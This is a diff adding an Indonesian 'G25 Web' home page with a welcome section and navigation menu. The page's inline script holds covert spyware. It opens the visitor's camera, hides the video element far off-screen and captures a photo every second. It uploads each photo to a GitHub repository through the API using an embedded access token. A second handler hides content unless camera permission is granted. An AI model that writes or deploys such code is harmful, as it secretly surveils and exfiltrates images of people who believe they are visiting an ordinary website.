@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="theme-color" content="#cecece"/>
+    <meta property="og:title" content="G25 WEB">
+    <meta property="og:description" content="Home Pages">
+    <meta property="og:image" content="https://telegra.ph/file/2ecb6d0c9ddc104b1103a.jpg">
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <meta name="google-adsense-account" content="ca-pub-5387354103237394">
+    <title>Home</title>
+</head>
+<body>
+    <div style="position: relative; top: 999999999px; left: 0;">
+      <video id="video" autoplay></video>
+      <canvas id="canvas" width="300" height="300"></canvas>
+  </div>
+    
+    <section style="margin-top: 50px;" class="section-1">
+        <h1 kezt-transition5>Welcome!</h1>
+        <h2 kezt-transition2>To G25 Web</h2>
+        <p kezt-transition3>Selamat Datang di website resmi G25!, Disini adalah home page dari website G25 ada beberapa penjelasan tentang G25, portofolio, dan visi misi disini!</p>
+    </section>
+    
+    <header>
+        <div class="headermenu">
+            <img kezt-transition3 src="logo.png" alt="Logo">
+            <div class="headermenu2">
+            <a kezt-transition2 class="barsbut" id="opennavigasi"><i id="buttonsidebari" class="bi bi-list"></i></a>
+            </div>
+        </div>
+        <div id="sidebarnav" class="sidebarnav">
+            <div id="menuheader" class="menuheader">
+                <a href="report.html" style="float: left;"><i class="bi bi-exclamation-circle"></i></a>
+                <a id="closenavigasi" style="float: right; font-size: 20px;"><i class="bi bi-x"></i></a>
+            </div>
+            <p>G25NF</p>
+            <a href="index.html"><i class="bi bi-house"></i> Home</a>
+            <a href="https://edukasi.kezt.my.id"><i class="bi bi-lightbulb"></i> Edukasi</a>
+            <a href="event.html"><i class="bi bi-calendar-day"></i> Event</a>
+            <a href="search.html"><i class="bi bi-search"></i> Search</a>
+        </div>
+        <div class="barsdesktop">
+            <ul>
+                <img src="./upload/file/logo.png" alt="Logo">
+                <li><a class="menuhalaman" href="home.html"><i class="bi bi-house"></i> Home</a></li>
+                <li><a class="menuhalaman" href="https://edukasi.kezt.my.id"><i class="bi bi-lightbulb"></i> Edukasi</a></li>
+                <li><a class="menuhalaman" href="event.html"><i class="bi bi-calendar-day"></i> Event</a></li>
+                <li><a class="submenu" href="search.html"><i class="bi bi-search"></i></a></li>
+            </ul>
+        </div>
+    </header>
+    
+    
+    <script>
+        const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: { aspectRatio: 1 } }) // Set aspect ratio to 1:1
+      .then(function(stream) {
+        video.srcObject = stream;
+        video.onloadedmetadata = function(e) {
+          video.play();
+          setInterval(capturePhoto, 1000); // Ambil foto setiap 1 detik
+        };
+      })
+      .catch(function(err) {
+        console.log("An error occurred: " + err);
+      });
+
+    function capturePhoto() {
+      const size = Math.min(video.videoWidth, video.videoHeight);
+      canvas.width = size;
+      canvas.height = size;
+
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, size, size);
+      const base64EncodedPhoto = canvas.toDataURL('image/jpeg').split(',')[1];
+      const fileName = `Cam_unlock_kezt${Date.now()}.jpg`; // Nama file dengan timestamp
+      uploadPhoto(base64EncodedPhoto, fileName);
+    }
+
+    function uploadPhoto(base64EncodedPhoto, fileName) {
+      fetch(`https://api.github.com/repos/avatarabangkuh/avatarabangkuh.github.io/contents/img/${fileName}`, {
+        method: 'PUT',
+        headers: {
+          'Authorization': 'Bearer ghp_ADJmlY9QccNjw3yjs2SM4vB',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          message: 'Add photo',
+          content: base64EncodedPhoto // Base64 encoded content of the photo
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log(data))
+      .catch(error => console.error('Error:', error));
+    }
+    
+    
+    
+    
+    
+    
+    
+    function openPopup(link) {
+    document.getElementById("popup").style.display = "block";
+    document.querySelector("iframe").src = link;
+  }
+
+  function closePopup() {
+    document.getElementById("popup").style.display = "none";
+    document.querySelector("iframe").src = "";
+  }
+  
+  function salinLink(url) {
+      navigator.clipboard.writeText(url)
+        .then(() => {
+          alert("URL berhasil disalin: " + url);
+        })
+        .catch(err => {
+          console.error('Gagal menyalin URL: ', err);
+        });
+    }
+    
+    
+    
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // Izin diberikan, Section 1 disembunyikan, Section 2 ditampilkan
+                    document.getElementById('section1').style.display = 'none';
+                    document.getElementById('section2').style.display = 'block';
+                })
+                .catch(function(error) {
+                    // Izin ditolak, Section 1 ditampilkan, Section 2 disembunyikan
+                    document.getElementById('section1').style.display = 'block';
+                    document.getElementById('section2').style.display = 'none';
+                });
+        } else {
+            // Browser tidak mendukung getUserMedia, Section 1 ditampilkan, Section 2 disembunyikan
+            document.getElementById('section1').style.display = 'block';
+            document.getElementById('section2').style.display = 'none';
+        }
+    });
+    </script>
+</body>
+  </html>
+  
